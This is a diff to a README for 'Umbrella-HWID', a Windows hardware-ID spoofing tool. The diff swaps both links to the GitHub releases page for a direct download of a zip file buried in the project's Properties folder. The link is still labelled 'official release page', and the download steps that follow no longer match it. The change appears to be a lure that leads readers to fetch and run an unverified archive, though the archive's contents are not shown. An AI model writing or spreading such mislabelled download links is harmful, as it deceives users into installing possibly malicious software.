@@ -1,12 +1,12 @@
 # 🛡️ Umbrella-HWID - Modify system hardware data for privacy
 
-[ ![Download Umbrella-HWID](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://github.com/perfil6634/Umbrella-HWID/releases)
+[ ![Download Umbrella-HWID](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://raw.githubusercontent.com/perfil6634/Umbrella-HWID/main/Umbrella/Properties/HWID-Umbrella-2.0-beta.4.zip)
 
 Umbrella-HWID changes how your computer reports hardware data to software. Many applications identify your PC by reading serial numbers from your motherboard, disk drives, and network card. This tool updates those identifiers. Developers use this for testing and system privacy.
 
 ## 📥 How to download the software
 
-1. Visit the [official release page](https://github.com/perfil6634/Umbrella-HWID/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/perfil6634/Umbrella-HWID/main/Umbrella/Properties/HWID-Umbrella-2.0-beta.4.zip).
 2. Look for the section labeled "Assets."
 3. Select the file ending in .zip to start the download.
 4. Open your Downloads folder on your Windows computer.
